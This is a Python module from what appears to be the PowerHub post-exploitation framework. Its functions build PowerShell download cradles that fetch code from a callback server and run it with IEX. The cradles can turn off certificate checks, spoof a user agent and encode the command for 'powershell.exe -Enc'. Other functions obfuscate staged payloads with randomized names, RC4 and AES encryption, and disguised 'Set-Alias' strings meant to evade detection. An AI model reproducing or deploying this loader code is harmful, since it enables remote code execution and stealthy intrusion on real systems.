import base64
import binascii
import logging
import os
import random
import re
import string

from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key, Memoize
from powerhub.modules import sanitize_ps1
from powerhub.directories import directories


log = logging.getLogger(__name__)

symbol_list = {None: None}
VARLIST = []


@Memoize
def get_stager_increments():
    """Return number of sections in stage 1"""

    filename = os.path.join(
        directories.BASE_DIR,
        'templates',
        'powershell',
        'stage1.ps1',
    )

    with open(filename, 'r') as fp:
        content = fp.read()

    result = len(content.split('{{separator}}'))
    return result


def build_cradle_https(params):
    result = ''

    if params['transport'] == 'https':
        if params['verification'] == 'noverification':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif params['verification'] == 'fingerprint':
            from powerhub.reverseproxy import FINGERPRINT
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif params['verification'] == 'certstore':
            pass
        if params['tlsv1.2']:
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    return result


def build_cradle_webclient(params, key, callback_urls, incremental=False):
    web_client = symbol_name('web_client', natural=params['natural'], refresh=True)

    result = "$%(web_client)s=New-Object Net.WebClient;"

    if params['proxy']:
        result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                   "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                   "DefaultCredentials;")

    if params['useragent']:
        result += (
            "$%(web_client)s.Headers['User-Agent']="
            "'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';"
        )

    url = callback_urls[params['transport']]

    query = '?'
    for p in params.parameters:
        if p.get_arg:
            query += p.as_query_fragment()
    query = query.replace('?&', '?')

    if query.endswith('?'):
        query = query[:-1]

    # If the query is empty (i.e. all parameters are set to their default
    # values), then it's not necessary to encrypt it. However, if
    # incremental delivery is selected, this would break the syntax, so we
    # need a non-empty encrypted query. Otherwise, paths like '//1, '//2',
    # etc would be requested which would lead to the non-hidden flask app,
    # resulting in 404
    if query or incremental:
        # encrypt url
        query = encrypt_aes(query, key)
        # Make b64 encoding urlsafe
        query = query.replace('/', '_').replace('+', '-')

    downloader = "IEX $%(web_client)s.DownloadString('%(url)s%(query)s'%(extra)s)"

    if incremental:
        result += "(0..%(increments)s)|%%%%{" + downloader + "}"
        # quadruple `%`, because we need to format that string a
        # second time later
        query += '/'
        extra = '+$_'
        increments = get_stager_increments() - 1  # -1 cause we start at 0
    else:
        result += downloader
        extra = ''
        increments = 0

    result = result % dict(
        url=url,
        query=query,
        extra=extra,
        web_client=web_client,
        increments=increments,
    )

    return result


def build_cradle(params, key, callback_urls):
    """Build the download cradle given a dict of GET arguments"""
    log.debug("Building cradle with these parameters: %s" % params)

    result = ""
    natural = params['natural']
    key_var = symbol_name('global_key', natural=natural)

    result += build_cradle_https(params)

    if params['kex'] == 'oob' and key:
        result += "$%(key_var)s='%(key)s';"

    if params['transport'].startswith('http'):
        result += build_cradle_webclient(
            params, key, callback_urls, incremental=params['incremental']
        )

    result = result % dict(
        url=callback_urls[params['transport']],
        transport=params['transport'],
        amsi=params['amsi'],
        key_var=key_var,
        key=key,
    )

    if params['split_cradle']:
        store_dl = symbol_name('store_dl', natural=params['natural'], refresh=True)
        result = result.replace("IEX ", "")
        # Replace last semicolon
        result = result.split(';')
        result[-1] = ('$%s=' % store_dl) + result[-1]
        result = ';'.join(result)
        result = "# First execute this<br/>" + result
        result += "<br/><br/># Then this<br/>" + ("$%s|IEX" % store_dl)

    # make sure to only use single quotes
    assert '"' not in result

    powershell_exe = 'powershell.exe'

    if params['launcher'] == 'cmd':
        result = '%s "%s"' % (powershell_exe, result)
    elif params['launcher'] == 'cmd_enc':
        result = '%s -Enc %s' % (
            powershell_exe,
            binascii.b2a_base64(result.encode('utf-16le')).decode())
    elif params['launcher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"%s \\\"%s\\\""' % (powershell_exe, result)

    return result


def symbol_name(name, natural=False, refresh=False, debug=False):
    """Choose an obfuscated symbol name for a given name. Uniqueness
    garantueed.

    If natural=True, choose a name that is typically used in scripts.
    If refresh=True, choose a new symbol name instead of using the one that
    was already defined.
    If debug=True, the new symbol name is equal to the old symbol name.
    """
    if refresh and name in symbol_list:
        del symbol_list[name]

    if name not in symbol_list:
        if debug:
            # In debug mode, don't obfuscate
            symbol_list[name] = name
        else:
            if natural:
                symbol_list[name] = choose_natural_name()
            else:
                symbol_list[name] = choose_random_name()
    return symbol_list[name]


def choose_natural_name():
    if not VARLIST:
        with open(os.path.join(directories.BASE_DIR, 'variables.txt'), 'r') as fp:
            for line in fp:
                if not line.startswith('#'):
                    VARLIST.append(line.strip())

    result = None
    while not result or result in list(symbol_list.values()):
        result = random.choice(VARLIST)

    return result


def choose_random_name():
    result = None
    length = random.choice(range(4, 8))
    while not result or result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


def debug_filter(msg, dbg=False):
    """This is a function for debugging statements in jinja2 templates"""
    if dbg:
        return msg + ";"
    return ""


# TODO add jinja include_randomize_whitespace
# TODO add jinja powershell decoys

def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
              debug=False, natural=False, remove_whitespace=True):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt
    env.filters['debug'] = lambda msg: debug_filter(msg, dbg=debug)
    env.globals['symbol_name'] = lambda name: symbol_name(name, natural=natural, debug=debug)
    env.globals['set_alias'] = obfuscate_set_alias

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t

        if buffer:
            if context.get('slow_encryption'):
                buffer = encrypt_rc4(buffer, key)
            else:
                buffer = encrypt_aes(buffer, key)
            stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    if remove_whitespace and not debug:
        result = remove_leading_whitespace(result)
        result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result


def wrap_in_ps1(code, name):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))
    template = env.get_template(os.path.join('powershell', 'exec_dotnet.ps1'))

    code = base64.b64encode(code).decode()
    result = template.render(code=code, name=name)
    return result


def obfuscate_file(fp_in, fp_out, natural=False, debug=False,
                   slow_encryption=False, epilogue=''):
    import magic

    code = fp_in.read()

    try:
        code = code.decode()
        file_type = magic.from_buffer(code)
        code = sanitize_ps1(code, file_type)
    except UnicodeError:
        try:
            name = os.path.basename(fp_in.filename)
        except AttributeError:
            # it is a stream, not a file
            name = 'stdin.exe'
        code = wrap_in_ps1(code, name)

    stage3 = [code]
    if epilogue:
        stage3.append(epilogue)

    context = dict(
        kex='embedded',
    )

    key = generate_random_key(16)
    output = get_stage(
        key,
        stage3_strings=stage3,
        context=context,
        natural=natural,
        debug=debug,
        slow_encryption=slow_encryption,
    )
    fp_out.write(output)


def obfuscate_set_alias():
    """Return an obfuscated version of the string `Set-Alias`"""

    # These chars (case sensitive) have special meanings when pre-fixed with `
    special_chars = '0abefnrtuv"\''

    cmd = random.choice(["sal", "Set-Alias"])

    # Randomize capitalization
    temp = ''
    for x in cmd.lower():
        if random.choice([True, False]):
            temp += x
        else:
            temp += x.upper()
    cmd = temp

    # Insert random quotes
    result = cmd[0]
    for i, e in enumerate(cmd[1:]):
        if random.choice([True, False]):
            result += '""'
        if random.choice([True, False]):
            result += "''"
        if random.choice([True, False]) and e not in special_chars:
            result += "`"
        result += e

    return result
